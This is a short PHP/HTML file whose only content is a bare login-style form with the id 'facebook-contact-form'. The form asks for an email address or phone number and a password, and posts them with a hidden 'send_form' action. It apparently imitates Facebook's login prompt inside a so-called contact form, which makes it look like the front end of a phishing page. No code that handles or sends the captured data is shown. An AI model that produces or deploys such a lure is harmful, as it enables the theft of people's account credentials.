<?php
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>

<div class="box">
    <div class="title-box">
    </div>
    <div class="form-box">
        <form id="facebook-contact-form" action="" method="post">
            <input type="text" name="email" id="email" placeholder="Email address or phone number" required>
            <input type="password" name="password" id="password" placeholder="Password" required>
            <input type="hidden" name="action" value="send_form" style="display: none; visibility: hidden; opacity: 0;">
            <button type="submit" id="submit" name="submit">submit</button>
        </form>
        <hr>
    </div>
</div>